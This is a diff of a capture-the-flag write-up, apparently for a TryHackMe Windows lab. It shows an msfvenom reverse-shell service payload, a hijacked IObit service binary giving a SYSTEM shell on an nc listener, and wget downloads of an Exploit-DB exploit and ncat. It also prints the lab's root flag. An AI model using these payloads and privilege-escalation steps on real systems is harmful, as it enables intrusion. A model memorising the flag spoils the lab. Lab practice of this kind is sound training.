@@ -274,6 +274,21 @@ msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
 
 ```Bash
 meterpreter > pwd
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+```Bash
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+```
+
+```Bash
+meterpreter > pwd
 C:\Users\bill\Desktop
 ```
 
@@ -501,8 +516,13 @@ Name                            : LiveUpdateSvc
 Check                           : Modifiable Service Files
 ```
 
+```PowerShell
+PS > ^C
+Terminate channel 5? [y/N]  y
+```
+
 ```Bash
-root@ip-10-10-199-181:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.199.181 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+root@ip-10-10-199-181:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.199.181 LPORT=9999 -e x86/shikata_ga_nai -f exe-service -o Payload.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -511,30 +531,158 @@ x86/shikata_ga_nai succeeded with size 351 (iteration=0)
 x86/shikata_ga_nai chosen with final size 351
 Payload size: 351 bytes
 Final size of exe-service file: 15872 bytes
-Saved as: Advanced.exe
-```
+Saved as: Payload.exe
 
-```PowerShell
-PS > ^C
-Terminate channel 5? [y/N]  y
 ```
 
 ```Bash
-meterpreter > upload /root/Advanced.exe
-[*] Uploading  : /root/Advanced.exe -> Advanced.exe
-[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Advanced.exe -> Advanced.exe
-[*] Completed  : /root/Advanced.exe -> Advanced.exe
+meterpreter > upload /root/Payload.exe
+[*] Uploading  : /root/Payload.exe -> Payload.exe
+[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Payload.exe -> Payload.exe
+[*] Completed  : /root/Payload.exe -> Payload.exe
 ```
 
 ```Bash
-meterpreter > powershell_shell
+meterpreter > shell
+Process 2344 created.
+Channel 6 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
 ```
 
 ```PowerShell
-PS > sc stop AdvancedSystemCareService9
+C:\Users\bill\Desktop>copy Payload.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+Overwrite C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): All
+All
+        1 file(s) copied.
 ```
 
-```copy ASCService C:\Program Files (x86)\IObit\AdvancedSystemCare\ASCService.exe
+```PowerShell
+C:\Users\bill\Desktop>sc.exe start AdvancedSystemCareService9
+sc.exe stop AdvancedSystemCareService9
 
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2372
+        FLAGS              : 
+```
+
+```Bash
+root@ip-10-10-199-181:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+```
+
+```PowerShell
+C:\Users\bill\Desktop>sc.exe start AdvancedSystemCareService9
+sc.exe start AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2372
+        FLAGS              : 
+```
+
+```Bash
+Listening on [0.0.0.0] (family 0, port 9999)
+Connection from 10.10.206.36 49376 received!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+```
+
+```PowerShell
+C:\>dir /s root.txt
+dir /s root.txt
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+09/27/2019  05:41 AM                32 root.txt
+               1 File(s)             32 bytes
+
+     Total Files Listed:
+               1 File(s)             32 bytes
+               0 Dir(s)  44,155,133,952 bytes free
+```
+
+```PowerShell
+C:\>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+9af5f314f57607c00fd09803a587db80
+```
 
 # Task 4: Access and Escalation Without Metasploit
+
+```Bash
+root@ip-10-10-114-31:~# wget https://www.exploit-db.com/raw/39161
+--2023-07-20 21:31:56--  https://www.exploit-db.com/raw/39161
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2515 (2.5K) [text/plain]
+Saving to: \u201839161\u2019
+
+39161             100%[=============>]   2.46K  --.-KB/s    in 0s      
+
+2023-07-20 21:31:56 (442 MB/s) - \u201839161\u2019 saved [2515/2515]
+```
+
+```Bash
+root@ip-10-10-114-31:~# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
+--2023-07-20 22:04:23--  https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
+Resolving github.com (github.com)... 140.82.121.3
+Connecting to github.com (github.com)|140.82.121.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/windows/x86/ncat.exe [following]
+--2023-07-20 22:04:24--  https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/windows/x86/ncat.exe
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2332672 (2.2M) [application/octet-stream]
+Saving to: \u2018ncat.exe\u2019
+
+ncat.exe          100%[=============>]   2.22M  --.-KB/s    in 0.07s   
+
+2023-07-20 22:04:24 (31.9 MB/s) - \u2018ncat.exe\u2019 saved [2332672/2332672]
+```
+
+```Bash
+root@ip-10-10-114-31:~# python 39161 
+  File "39161", line 49
+    Don't forgot to change the Local IP address and Port number on the script"""
+                                                                               ^
+SyntaxError: Missing parentheses in call to 'print'. Did you mean print("""[.]Something went wrong..!
+	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
+	Don't forgot to change the Local IP address and Port number on the script""")?
+```
+
+```Bash
+root@ip-10-10-114-31:~# mousepad 39161 
+```
+
+![]()
+
+![]()
+
+```Bash
+root@ip-10-10-114-31:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+```
+
+```Bash
+root@ip-10-10-114-31:~# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
